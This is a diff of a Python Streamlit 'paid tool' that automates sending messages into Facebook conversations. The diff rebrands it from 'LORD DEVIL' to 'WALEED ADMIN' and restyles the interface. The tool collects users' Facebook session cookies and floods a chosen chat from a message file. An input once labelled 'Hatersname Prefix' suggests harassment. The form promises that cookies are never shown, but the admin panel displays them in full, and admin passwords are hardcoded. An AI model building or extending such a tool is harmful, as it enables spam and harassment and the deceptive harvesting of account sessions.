+        border: 2px solid rgba(255, 107, 53, 0.3);
+        margin: 0.8rem 0;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
     }}
     
     .admin-log-line {{
-        margin: 1px 0;
-        padding: 1px 3px;
-        border-radius: 2px;
-        animation: adminRainbow 2s infinite alternate;
-        text-shadow: 0 0 5px currentColor;
+        margin: 6px 0;
+        padding: 8px 12px;
+        border-radius: 8px;
+        background: rgba(255, 107, 53, 0.05);
+        border-left: 2px solid {THEME_COLORS['primary']};
+        animation: adminLogEntry 0.3s ease-out;
     }}
     
-    @keyframes adminRainbow {{
-        0% {{ color: #ff6b6b; }}
-        20% {{ color: #feca57; }}
-        40% {{ color: #48dbfb; }}
-        60% {{ color: #ff9ff3; }}
-        80% {{ color: #54a0ff; }}
-        100% {{ color: #00d2d3; }}
+    @keyframes adminLogEntry {{
+        from {{
+            opacity: 0;
+            transform: translateX(-5px);
+        }}
+        to {{
+            opacity: 1;
+            transform: translateX(0);
+        }}
+    }}
+    
+    /* Metrics styling */
+    .metric-box {{
+        background: linear-gradient(135deg, 
+            rgba(26, 26, 46, 0.9) 0%, 
+            rgba(38, 38, 62, 0.9) 100%);
+        padding: 1.5rem;
+        border-radius: 18px;
+        border: 1px solid rgba(255, 107, 53, 0.2);
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        text-align: center;
+        backdrop-filter: blur(10px);
+    }}
+    
+    .metric-value {{
+        font-size: 2.5rem;
+        font-weight: 900;
+        color: {THEME_COLORS['primary']};
+        text-shadow: 0 0 15px rgba(255, 107, 53, 0.3);
+        margin-bottom: 0.5rem;
+    }}
+    
+    .metric-label {{
+        font-size: 1rem;
+        color: rgba(255, 255, 255, 0.8);
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }}
+    
+    /* Tab styling */
+    .stTabs {{
+        background: transparent !important;
+    }}
+    
+    .stTabs [data-baseweb="tab-list"] {{
+        gap: 2rem !important;
+        padding: 1rem !important;
+        background: rgba(26, 26, 46, 0.9) !important;
+        border-radius: 15px !important;
+        border: 1px solid rgba(255, 107, 53, 0.2) !important;
+        backdrop-filter: blur(10px) !important;
+    }}
+    
+    .stTabs [data-baseweb="tab"] {{
+        background: transparent !important;
+        color: rgba(255, 255, 255, 0.6) !important;
+        font-weight: 600 !important;
+        padding: 1rem 2rem !important;
+        border-radius: 10px !important;
+        transition: all 0.3s ease !important;
+    }}
+    
+    .stTabs [data-baseweb="tab"]:hover {{
+        background: rgba(255, 107, 53, 0.1) !important;
+        color: white !important;
+    }}
+    
+    .stTabs [aria-selected="true"] {{
+        background: linear-gradient(135deg, {THEME_COLORS['primary']}, {THEME_COLORS['accent']}) !important;
+        color: white !important;
+        box-shadow: 0 5px 20px rgba(255, 107, 53, 0.3) !important;
+    }}
+    
+    /* Sidebar styling */
+    .sidebar .sidebar-content {{
+        background: linear-gradient(135deg, 
+            rgba(26, 26, 46, 0.95) 0%, 
+            rgba(38, 38, 62, 0.95) 100%);
+        border-right: 1px solid rgba(255, 107, 53, 0.2);
+        backdrop-filter: blur(15px);
+    }}
+    
+    /* Checkbox styling */
+    .stCheckbox {{
+        color: white !important;
+    }}
+    
+    .stCheckbox>div>label {{
+        color: white !important;
+        font-weight: 500 !important;
+    }}
+    
+    /* Divider */
+    hr {{
+        border: none;
+        height: 2px;
+        background: linear-gradient(90deg, 
+            transparent, 
+            {THEME_COLORS['primary']}, 
+            transparent);
+        margin: 2rem 0;
     }}
 </style>
 """
@@ -952,19 +1261,22 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
             except:
                 pass
 
+# UPDATED: Changed from "lord devil" to "WALEED ADMIN"
 def send_approval_request_via_whatsapp(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    message = f"Hello WALEED ADMIN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
     whatsapp_url = f"https://wa.me/917668337116?text={requests.utils.quote(message)}"
     return whatsapp_url
 
+# UPDATED: Changed from "lord devil" to "WALEED ADMIN"
 def send_approval_request_via_facebook(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    facebook_url = f"https://www.facebook.com/Lord Devil.X"
+    message = f"Hello WALEED ADMIN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    facebook_url = f"https://www.facebook.com/WALEED.ADMIN"
     return facebook_url
 
+# UPDATED: Changed from "lord devil" to "WALEED ADMIN"
 def send_approval_request_via_telegram(user_real_name, approval_key):
-    message = f"Hello lord devil sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
-    telegram_url = f"https://t.me/itxthedevil?text={requests.utils.quote(message)}"
+    message = f"Hello WALEED ADMIN sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
+    telegram_url = f"https://t.me/WALEED_ADMIN?text={requests.utils.quote(message)}"
     return telegram_url
 
 def run_automation_with_notification(user_config, username, automation_state, user_id):
@@ -1027,32 +1339,33 @@ def stop_automation(user_id):
 # Main application
 st.markdown('<div class="main-container">', unsafe_allow_html=True)
 
-# Profile Icon
-st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
+# Tool Logo
+st.markdown('<div class="tool-logo"></div>', unsafe_allow_html=True)
 
-# UPDATED NAME HERE ONLY - "Waleed Paid Tool E2E Update v.12"
-st.markdown('<div class="main-header"><h1>Waleed Paid Tool E2E Update v.12</h1><p>Created by LORD DEVIL</p></div>', unsafe_allow_html=True)
+# Main Header with WALEED branding
+st.markdown('<div class="main-header"><h1>WALEED PAID TOOL E2E UPDATE V.12</h1><p>Premium Facebook Automation Solution</p><p class="version">VERSION 12.0 | PREMIUM EDITION</p></div>', unsafe_allow_html=True)
 
 # Admin Panel
-if st.sidebar.checkbox("🔐 Admin Login"):
+if st.sidebar.checkbox("🔐 ADMIN ACCESS"):
     admin_username = st.sidebar.text_input("Admin Username", key="admin_username")
     admin_password = st.sidebar.text_input("Admin Password", type="password", key="admin_password")
     
-    if st.sidebar.button("Login as Admin"):
-        if admin_username == "DEVILX0221" and admin_password == "LORDX0221":
+    if st.sidebar.button("LOGIN AS ADMIN", use_container_width=True):
+        # UPDATED: Changed admin credentials to WALEED
+        if admin_username == "WALEED_ADMIN" and admin_password == "WALEEDX2025":
             st.session_state.admin_logged_in = True
-            st.sidebar.success("Admin login successful!")
+            st.sidebar.success("✅ ADMIN ACCESS GRANTED!")
         else:
-            st.sidebar.error("Invalid admin credentials!")
+            st.sidebar.error("❌ INVALID CREDENTIALS!")
 
 if st.session_state.admin_logged_in:
-    st.markdown("### 👑 Admin Control Panel")
+    st.markdown("### 🔥 ADMIN CONTROL PANEL")
     
     # Get all pending approvals
     pending_users = db.get_pending_approvals()
     
     if pending_users:
-        st.markdown(f"#### ⏳ Pending Approvals ({len(pending_users)})")
+        st.markdown(f"#### ⏳ PENDING APPROVALS ({len(pending_users)})")
         
         for user in pending_users:
             user_id, username, approval_key, real_name = user
@@ -1063,28 +1376,28 @@ if st.session_state.admin_logged_in:
                 with col1:
                     st.markdown(f"""
                     <div class="user-card pending">
-                        <strong>Username:</strong> {username}<br>
-                        <strong>Real Name:</strong> {real_name}<br>
-                        <strong>Approval Key:</strong> <code>{approval_key}</code>
+                        <strong>👤 Username:</strong> {username}<br>
+                        <strong>📝 Real Name:</strong> {real_name}<br>
+                        <strong>🔑 Approval Key:</strong> <code>{approval_key}</code>
                     </div>
                     """, unsafe_allow_html=True)
                 
                 with col2:
-                    if st.button(f"✅ Approve", key=f"approve_{user_id}"):
+                    if st.button(f"✅ APPROVE", key=f"approve_{user_id}"):
                         db.update_approval_status(user_id, 'approved')
-                        st.success(f"Approved user: {username}")
+                        st.success(f"✅ USER APPROVED: {username}")
                         st.rerun()
                 
                 with col3:
-                    if st.button(f"❌ Reject", key=f"reject_{user_id}"):
+                    if st.button(f"❌ REJECT", key=f"reject_{user_id}"):
                         db.update_approval_status(user_id, 'rejected')
-                        st.error(f"Rejected user: {username}")
+                        st.error(f"❌ USER REJECTED: {username}")
                         st.rerun()
     
     # Show all approved users with remove option
     approved_users = db.get_approved_users()
     if approved_users:
-        st.markdown("#### ✅ Approved Users - Live Monitoring")
+        st.markdown("#### ✅ APPROVED USERS - LIVE MONITORING")
         
         for user in approved_users:
             user_id, username, approval_key, real_name, automation_running = user
@@ -1100,10 +1413,10 @@ if st.session_state.admin_logged_in:
                 st.markdown(f"""
                 <div class="admin-user-details">
                     <h4>👤 {username} | 🆔 {user_id}</h4>
-                    <p><strong>Real Name:</strong> {real_name} | <strong>Chat ID:</strong> {chat_id}</p>
-                    <p><strong>Prefix:</strong> {prefix} | <strong>Delay:</strong> {delay}s | <strong>Messages:</strong> {messages_count} lines</p>
-                    <p><strong>Status:</strong> {'🟢 RUNNING' if automation_running else '🔴 STOPPED'}</p>
-                    <p><strong>Cookies:</strong> {cookies[:100]}...</p>
+                    <p><strong>📝 Real Name:</strong> {real_name} | <strong>💬 Chat ID:</strong> {chat_id}</p>
+                    <p><strong>🏷️ Prefix:</strong> {prefix} | <strong>⏱️ Delay:</strong> {delay}s | <strong>📨 Messages:</strong> {messages_count} lines</p>
+                    <p><strong>📊 Status:</strong> {'🟢 RUNNING' if automation_running else '🔴 STOPPED'}</p>
+                    <p><strong>🍪 Cookies:</strong> {cookies[:100]}...</p>
                 </div>
                 """, unsafe_allow_html=True)
                 
@@ -1118,48 +1431,48 @@ if st.session_state.admin_logged_in:
                 col1, col2, col3, col4 = st.columns(4)
                 
                 with col1:
-                    if st.button(f"🗑️ Remove Approval", key=f"remove_{user_id}", use_container_width=True):
+                    if st.button(f"🗑️ REMOVE APPROVAL", key=f"remove_{user_id}", use_container_width=True):
                         db.update_approval_status(user_id, 'rejected')
                         if automation_running:
                             stop_automation(user_id)
-                        st.error(f"Removed approval for: {username}")
+                        st.error(f"❌ APPROVAL REMOVED: {username}")
                         st.rerun()
                 
                 with col2:
                     if automation_running:
-                        if st.button(f"⏹️ Stop Automation", key=f"stop_{user_id}", use_container_width=True):
+                        if st.button(f"⏹️ STOP AUTOMATION", key=f"stop_{user_id}", use_container_width=True):
                             stop_automation(user_id)
-                            st.warning(f"Stopped automation for: {username}")
+                            st.warning(f"⚠️ AUTOMATION STOPPED: {username}")
                             st.rerun()
                     else:
-                        if st.button(f"▶️ Start Automation", key=f"start_{user_id}", use_container_width=True):
+                        if st.button(f"▶️ START AUTOMATION", key=f"start_{user_id}", use_container_width=True):
                             if user_config and user_config['chat_id']:
                                 db.set_automation_running(user_id, True)
                                 start_automation(user_config, user_id)
-                                st.success(f"Started automation for: {username}")
+                                st.success(f"✅ AUTOMATION STARTED: {username}")
                                 st.rerun()
                             else:
-                                st.error("User needs to configure chat ID first")
+                                st.error("❌ USER NEEDS TO CONFIGURE CHAT ID FIRST")
                 
                 with col3:
-                    if st.button(f"📊 Full Details", key=f"details_{user_id}", use_container_width=True):
+                    if st.button(f"📊 FULL DETAILS", key=f"details_{user_id}", use_container_width=True):
                         if user_config:
                             st.markdown(f"""
-                            **🔍 Complete User Configuration:**
-                            - **User ID:** `{user_id}`
-                            - **Username:** `{username}`
-                            - **Real Name:** `{real_name}`
-                            - **Chat ID:** `{chat_id}`
-                            - **Prefix:** `{prefix}`
-                            - **Delay:** `{delay} seconds`
-                            - **Messages:** `{messages_count} lines`
-                            - **Cookies:** `{cookies}`
-                            - **Approval Key:** `{approval_key}`
-                            - **Status:** `{'RUNNING' if automation_running else 'STOPPED'}`
+                            **🔍 COMPLETE USER CONFIGURATION:**
+                            - **🆔 User ID:** `{user_id}`
+                            - **👤 Username:** `{username}`
+                            - **📝 Real Name:** `{real_name}`
+                            - **💬 Chat ID:** `{chat_id}`
+                            - **🏷️ Prefix:** `{prefix}`
+                            - **⏱️ Delay:** `{delay} seconds`
+                            - **📨 Messages:** `{messages_count} lines`
+                            - **🍪 Cookies:** `{cookies}`
+                            - **🔑 Approval Key:** `{approval_key}`
+                            - **📊 Status:** `{'🟢 RUNNING' if automation_running else '🔴 STOPPED'}`
                             """)
                 
                 with col4:
-                    if st.button(f"🔄 Refresh Logs", key=f"refresh_{user_id}", use_container_width=True):
+                    if st.button(f"🔄 REFRESH LOGS", key=f"refresh_{user_id}", use_container_width=True):
                         st.rerun()
                 
                 st.markdown("---")
@@ -1167,7 +1480,7 @@ if st.session_state.admin_logged_in:
     # Show all users
     all_users = db.get_all_users()
     if all_users:
-        st.markdown("#### 📊 All Users Summary")
+        st.markdown("#### 📊 ALL USERS SUMMARY")
         for user in all_users:
             user_id, username, approval_status, real_name, approval_key = user
             
@@ -1176,31 +1489,31 @@ if st.session_state.admin_logged_in:
             
             st.markdown(f"""
             <div class="user-card {status_class}">
-                {status_icon} <strong>Username:</strong> {username} | 
-                <strong>Status:</strong> {approval_status.upper() if approval_status else 'PENDING'} | 
-                <strong>Real Name:</strong> {real_name}
+                {status_icon} <strong>👤 Username:</strong> {username} | 
+                <strong>📊 Status:</strong> {approval_status.upper() if approval_status else 'PENDING'} | 
+                <strong>📝 Real Name:</strong> {real_name}
             </div>
             """, unsafe_allow_html=True)
     
-    if st.sidebar.button("Logout from Admin"):
+    if st.sidebar.button("LOGOUT FROM ADMIN", use_container_width=True):
         st.session_state.admin_logged_in = False
         st.rerun()
 
 elif not st.session_state.logged_in:
-    tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
+    tab1, tab2 = st.tabs(["🔐 LOGIN", "✨ SIGN UP"])
     
     with tab1:
-        st.markdown("### Welcome Back!")
+        st.markdown("### 🔥 WELCOME BACK!")
         
-        st.markdown('<div class="input-label">Username</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-label">USERNAME</div>', unsafe_allow_html=True)
         username = st.text_input("", key="login_username", placeholder="Enter your username", label_visibility="collapsed")
         st.markdown('<div class="input-hint">Enter your registered username</div>', unsafe_allow_html=True)
         
-        st.markdown('<div class="input-label">Password</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-label">PASSWORD</div>', unsafe_allow_html=True)
         password = st.text_input("", key="login_password", type="password", placeholder="Enter your password", label_visibility="collapsed")
         st.markdown('<div class="input-hint">Enter your account password</div>', unsafe_allow_html=True)
         
-        if st.button("Login", key="login_btn", use_container_width=True):
+        if st.button("LOGIN", key="login_btn", use_container_width=True):
             if username and password:
                 user_id = db.verify_user(username, password)
                 if user_id:
@@ -1227,7 +1540,7 @@ elif not st.session_state.logged_in:
                             if user_config and user_config['chat_id']:
                                 start_automation(user_config, user_id)
                         
-                        st.success(f"Welcome back, {username}!")
+                        st.success(f"✅ WELCOME BACK, {username.upper()}!")
                         st.rerun()
                     else:
                         # User needs approval
@@ -1245,26 +1558,26 @@ elif not st.session_state.logged_in:
                         st.session_state.approval_key = approval_key
                         st.rerun()
                 else:
-                    st.error("Invalid username or password!")
+                    st.error("❌ INVALID USERNAME OR PASSWORD!")
             else:
-                st.warning("Please enter both username and password")
+                st.warning("⚠️ PLEASE ENTER BOTH USERNAME AND PASSWORD")
     
     with tab2:
-        st.markdown("### Create New Account")
+        st.markdown("### ✨ CREATE NEW ACCOUNT")
         
-        st.markdown('<div class="input-label">Choose Username</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-label">CHOOSE USERNAME</div>', unsafe_allow_html=True)
         new_username = st.text_input("", key="signup_username", placeholder="Choose a unique username", label_visibility="collapsed")
         st.markdown('<div class="input-hint">Select a unique username for your account</div>', unsafe_allow_html=True)
         
-        st.markdown('<div class="input-label">Choose Password</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-label">CHOOSE PASSWORD</div>', unsafe_allow_html=True)
         new_password = st.text_input("", key="signup_password", type="password", placeholder="Create a strong password", label_visibility="collapsed")
         st.markdown('<div class="input-hint">Create a secure password for your account</div>', unsafe_allow_html=True)
         
-        st.markdown('<div class="input-label">Confirm Password</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-label">CONFIRM PASSWORD</div>', unsafe_allow_html=True)
         confirm_password = st.text_input("", key="confirm_password", type="password", placeholder="Re-enter your password", label_visibility="collapsed")
         st.markdown('<div class="input-hint">Re-enter your password to confirm</div>', unsafe_allow_html=True)
         
-        if st.button("Create Account", key="signup_btn", use_container_width=True):
+        if st.button("CREATE ACCOUNT", key="signup_btn", use_container_width=True):
             if new_username and new_password and confirm_password:
                 if new_password == confirm_password:
                     result = db.create_user(new_username, new_password)
@@ -1281,59 +1594,59 @@ elif not st.session_state.logged_in:
                             approval_key = generate_approval_key(new_username, user_id)
                             db.set_approval_key(user_id, approval_key)
                         
-                        st.success(f"{message} Please login now!")
+                        st.success(f"✅ {message.upper()} PLEASE LOGIN NOW!")
                     else:
-                        st.error(f"{message}")
+                        st.error(f"❌ {message.upper()}")
                 else:
-                    st.error("Passwords do not match!")
+                    st.error("❌ PASSWORDS DO NOT MATCH!")
             else:
-                st.warning("Please fill all fields")
+                st.warning("⚠️ PLEASE FILL ALL FIELDS")
 
 else:
     # User is logged in but needs approval
     if st.session_state.approval_status != 'approved':
-        st.markdown("### 🔒 Approval Required")
+        st.markdown("### 🔒 APPROVAL REQUIRED")
         
         # User Info Box
         st.markdown(f"""
         <div class="user-info-box">
-            <h3>👤 User Information</h3>
-            <p><strong>Username:</strong> {st.session_state.username}</p>
-            <p><strong>Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
+            <h3>👤 USER INFORMATION</h3>
+            <p><strong>👤 Username:</strong> {st.session_state.username}</p>
+            <p><strong>📝 Real Name:</strong> {st.session_state.user_real_name if st.session_state.user_real_name else "Not provided"}</p>
         </div>
         """, unsafe_allow_html=True)
         
         # Approval Key Box
         st.markdown(f"""
         <div class="approval-key-box">
-            <h3>🔑 Your Approval Key</h3>
+            <h3>🔑 YOUR APPROVAL KEY</h3>
             <div class="approval-key-display">{st.session_state.approval_key}</div>
-            <button class="copy-btn" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 Copy Key</button>
+            <button class="copy-btn" onclick="navigator.clipboard.writeText('{st.session_state.approval_key}')">📋 COPY KEY</button>
         </div>
         """, unsafe_allow_html=True)
         
-        st.markdown("### 📝 Enter Your Real Name")
-        st.markdown('<div class="input-label">Your Real Name</div>', unsafe_allow_html=True)
+        st.markdown("### 📝 ENTER YOUR REAL NAME")
+        st.markdown('<div class="input-label">YOUR REAL NAME</div>', unsafe_allow_html=True)
         user_real_name = st.text_input("", key="real_name", placeholder="Enter your real name for approval", 
                                       value=st.session_state.user_real_name, label_visibility="collapsed")
-        st.markdown('<div class="input-hint">This name will be sent to LORD DEVIL for approval</div>', unsafe_allow_html=True)
+        st.markdown('<div class="input-hint">This name will be sent to WALEED ADMIN for approval</div>', unsafe_allow_html=True)
         
         if user_real_name:
             st.session_state.user_real_name = user_real_name
             db.update_user_real_name(st.session_state.user_id, user_real_name)
         
         # Send Approval Request Button
-        st.markdown("### 📤 Send Approval Request")
-        st.markdown("Click the button below to send your approval request to LORD DEVIL:")
+        st.markdown("### 📤 SEND APPROVAL REQUEST")
+        st.markdown("Click the button below to send your approval request to WALEED ADMIN:")
         
-        if st.button("📨 Send Approval Request", use_container_width=True, key="send_approval_btn"):
+        if st.button("📨 SEND APPROVAL REQUEST", use_container_width=True, key="send_approval_btn"):
             if st.session_state.user_real_name:
-                st.success("Approval request ready! Use the contact buttons below to send it.")
+                st.success("✅ APPROVAL REQUEST READY! USE THE CONTACT BUTTONS BELOW TO SEND IT.")
             else:
-                st.warning("Please enter your real name first")
+                st.warning("⚠️ PLEASE ENTER YOUR REAL NAME FIRST")
         
         # Contact buttons - ALWAYS VISIBLE
-        st.markdown("### 📞 Contact LORD DEVIL for Approval")
+        st.markdown("### 📞 CONTACT WALEED ADMIN FOR APPROVAL")
         st.markdown("Click any button below to send your approval request:")
         
         col1, col2, col3 = st.columns(3)
@@ -1343,36 +1656,36 @@ else:
                 st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                 st.session_state.approval_key
             )
-            st.markdown(f'<a href="{whatsapp_url}" class="contact-btn" target="_blank">📱 WhatsApp</a>', unsafe_allow_html=True)
+            st.markdown(f'<a href="{whatsapp_url}" class="contact-btn whatsapp" target="_blank">📱 WHATSAPP</a>', unsafe_allow_html=True)
         
         with col2:
             facebook_url = send_approval_request_via_facebook(
                 st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                 st.session_state.approval_key
             )
-            st.markdown(f'<a href="{facebook_url}" class="contact-btn facebook" target="_blank">👤 Facebook</a>', unsafe_allow_html=True)
+            st.markdown(f'<a href="{facebook_url}" class="contact-btn facebook" target="_blank">👤 FACEBOOK</a>', unsafe_allow_html=True)
         
         with col3:
             telegram_url = send_approval_request_via_telegram(
                 st.session_state.user_real_name if st.session_state.user_real_name else "Not Provided", 
                 st.session_state.approval_key
             )
-            st.markdown(f'<a href="{telegram_url}" class="contact-btn telegram" target="_blank">✈️ Telegram</a>', unsafe_allow_html=True)
+            st.markdown(f'<a href="{telegram_url}" class="contact-btn telegram" target="_blank">✈️ TELEGRAM</a>', unsafe_allow_html=True)
         
-        st.info("After sending the approval request, wait for LORD DEVIL to approve your key. Refresh this page to check your approval status.")
+        st.info("ℹ️ After sending the approval request, wait for WALEED ADMIN to approve your key. Refresh this page to check your approval status.")
         
         # Check approval status
-        if st.button("🔄 Check Approval Status", use_container_width=True):
+        if st.button("🔄 CHECK APPROVAL STATUS", use_container_width=True):
             current_status = db.get_approval_status(st.session_state.user_id)
             st.session_state.approval_status = current_status
             
             if current_status == 'approved':
-                st.success("🎉 Your account has been approved! You can now access the automation features.")
+                st.success("🎉 YOUR ACCOUNT HAS BEEN APPROVED! YOU CAN NOW ACCESS THE AUTOMATION FEATURES.")
                 st.rerun()
             else:
-                st.warning("Your approval is still pending. Please wait for LORD DEVIL to approve your request.")
+                st.warning("⏳ YOUR APPROVAL IS STILL PENDING. PLEASE WAIT FOR WALEED ADMIN TO APPROVE YOUR REQUEST.")
         
-        if st.sidebar.button("🚪 Logout"):
+        if st.sidebar.button("🚪 LOGOUT", use_container_width=True):
             st.session_state.logged_in = False
             st.session_state.user_id = None
             st.session_state.username = None
@@ -1392,10 +1705,10 @@ else:
                     start_automation(user_config, st.session_state.user_id)
         
         st.sidebar.markdown(f"### 👤 {st.session_state.username}")
-        st.sidebar.markdown(f"**Status:** ✅ Approved")
-        st.sidebar.markdown(f"**User ID:** {st.session_state.user_id}")
+        st.sidebar.markdown(f"**📊 Status:** ✅ APPROVED")
+        st.sidebar.markdown(f"**🆔 User ID:** {st.session_state.user_id}")
         
-        if st.sidebar.button("🚪 Logout", use_container_width=True):
+        if st.sidebar.button("🚪 LOGOUT", use_container_width=True):
             if st.session_state.automation_state.running:
                 stop_automation(st.session_state.user_id)
             
@@ -1412,30 +1725,30 @@ else:
         user_config = db.get_user_config(st.session_state.user_id)
         
         if user_config:
-            tab1, tab2 = st.tabs(["⚙️ Configuration", "🚀 Automation"])
+            tab1, tab2 = st.tabs(["⚙️ CONFIGURATION", "🚀 AUTOMATION"])
             
             with tab1:
-                st.markdown("### Your Configuration")
+                st.markdown("### ⚙️ YOUR CONFIGURATION")
                 
-                st.markdown('<div class="input-label">Chat/Conversation ID</div>', unsafe_allow_html=True)
+                st.markdown('<div class="input-label">CHAT/CONVERSATION ID</div>', unsafe_allow_html=True)
                 chat_id = st.text_input("", value=user_config['chat_id'], 
                                        placeholder="e.g., 1362400298935018 (Facebook conversation ID from URL)",
                                        label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Enter Facebook conversation ID from the URL</div>', unsafe_allow_html=True)
                 
-                st.markdown('<div class="input-label">Hatersname Prefix</div>', unsafe_allow_html=True)
+                st.markdown('<div class="input-label">NAME PREFIX</div>', unsafe_allow_html=True)
                 name_prefix = st.text_input("", value=user_config['name_prefix'],
-                                           placeholder="e.g., [END TO END LORD DEVIL HERE]",
+                                           placeholder="e.g., [WALEED E2E AUTOMATION]",
                                            label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Prefix to add before each message</div>', unsafe_allow_html=True)
                 
-                st.markdown('<div class="input-label">Delay (seconds)</div>', unsafe_allow_html=True)
+                st.markdown('<div class="input-label">DELAY (SECONDS)</div>', unsafe_allow_html=True)
                 delay = st.number_input("", min_value=1, max_value=300, 
                                        value=user_config['delay'],
                                        label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Wait time between messages (1-300 seconds)</div>', unsafe_allow_html=True)
                 
-                st.markdown('<div class="input-label">Facebook Cookies (optional)</div>', unsafe_allow_html=True)
+                st.markdown('<div class="input-label">FACEBOOK COOKIES (OPTIONAL)</div>', unsafe_allow_html=True)
                 cookies = st.text_area("", 
                                       value="",
                                       placeholder="Paste your Facebook cookies here (encrypted and private)",
@@ -1443,7 +1756,7 @@ else:
                                       label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Your cookies are encrypted and never shown to anyone</div>', unsafe_allow_html=True)
                 
-                st.markdown('<div class="input-label">Messages File Upload</div>', unsafe_allow_html=True)
+                st.markdown('<div class="input-label">MESSAGES FILE UPLOAD</div>', unsafe_allow_html=True)
                 uploaded_file = st.file_uploader("", type=['txt'], label_visibility="collapsed")
                 st.markdown('<div class="input-hint">Upload a .txt file with messages (one per line)</div>', unsafe_allow_html=True)
                 
@@ -1452,7 +1765,7 @@ else:
                 else:
                     messages_content = user_config.get('messages_file_content', '')
                 
-                if st.button("💾 Save Configuration", use_container_width=True):
+                if st.button("💾 SAVE CONFIGURATION", use_container_width=True):
                     final_cookies = cookies if cookies.strip() else user_config['cookies']
                     db.update_user_config(
                         st.session_state.user_id,
@@ -1462,41 +1775,56 @@ else:
                         final_cookies,
                         messages_content
                     )
-                    st.success("Configuration saved successfully!")
+                    st.success("✅ CONFIGURATION SAVED SUCCESSFULLY!")
                     st.rerun()
             
             with tab2:
-                st.markdown("### Automation Control")
+                st.markdown("### 🚀 AUTOMATION CONTROL")
                 
                 col1, col2, col3 = st.columns(3)
                 
                 with col1:
-                    st.metric("Messages Sent", st.session_state.automation_state.message_count)
+                    st.markdown(f"""
+                    <div class="metric-box">
+                        <div class="metric-value">{st.session_state.automation_state.message_count}</div>
+                        <div class="metric-label">MESSAGES SENT</div>
+                    </div>
+                    """, unsafe_allow_html=True)
                 
                 with col2:
-                    status = "🟢 Running" if st.session_state.automation_state.running else "🔴 Stopped"
-                    st.metric("Status", status)
+                    status = "🟢 RUNNING" if st.session_state.automation_state.running else "🔴 STOPPED"
+                    st.markdown(f"""
+                    <div class="metric-box">
+                        <div class="metric-value">{'RUNNING' if st.session_state.automation_state.running else 'STOPPED'}</div>
+                        <div class="metric-label">STATUS</div>
+                    </div>
+                    """, unsafe_allow_html=True)
                 
                 with col3:
-                    st.metric("Total Logs", len(st.session_state.automation_state.logs))
+                    st.markdown(f"""
+                    <div class="metric-box">
+                        <div class="metric-value">{len(st.session_state.automation_state.logs)}</div>
+                        <div class="metric-label">TOTAL LOGS</div>
+                    </div>
+                    """, unsafe_allow_html=True)
                 
                 col1, col2 = st.columns(2)
                 
                 with col1:
-                    if st.button("▶️ Start E2EE", disabled=st.session_state.automation_state.running, use_container_width=True):
+                    if st.button("▶️ START E2EE AUTOMATION", disabled=st.session_state.automation_state.running, use_container_width=True):
                         current_config = db.get_user_config(st.session_state.user_id)
                         if current_config and current_config['chat_id']:
                             start_automation(current_config, st.session_state.user_id)
                             st.rerun()
                         else:
-                            st.error("Please configure Chat ID first!")
+                            st.error("❌ PLEASE CONFIGURE CHAT ID FIRST!")
                 
                 with col2:
-                    if st.button("⏹️ Stop E2EE", disabled=not st.session_state.automation_state.running, use_container_width=True):
+                    if st.button("⏹️ STOP E2EE AUTOMATION", disabled=not st.session_state.automation_state.running, use_container_width=True):
                         stop_automation(st.session_state.user_id)
                         st.rerun()
                 
-                st.markdown("### 📜 Live Logs Console")
+                st.markdown("### 📜 LIVE LOGS CONSOLE")
                 
                 if st.session_state.automation_state.logs:
                     logs_html = '<div class="log-container">'
@@ -1505,11 +1833,11 @@ else:
                     logs_html += '</div>'
                     st.markdown(logs_html, unsafe_allow_html=True)
                 else:
-                    st.info("No logs yet. Start automation to see logs here.")
+                    st.info("ℹ️ No logs yet. Start automation to see logs here.")
                 
                 if st.session_state.automation_state.running:
                     time.sleep(1)
                     st.rerun()
 
 st.markdown('</div>', unsafe_allow_html=True)
-st.markdown('<div class="footer">Made with ❤️ by LORD DEVIL | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown(f'<div class="footer">🔥 MADE WITH PASSION BY WALEED | © 2025 WALEED PAID TOOL | VERSION 12.0</div>', unsafe_allow_html=True)
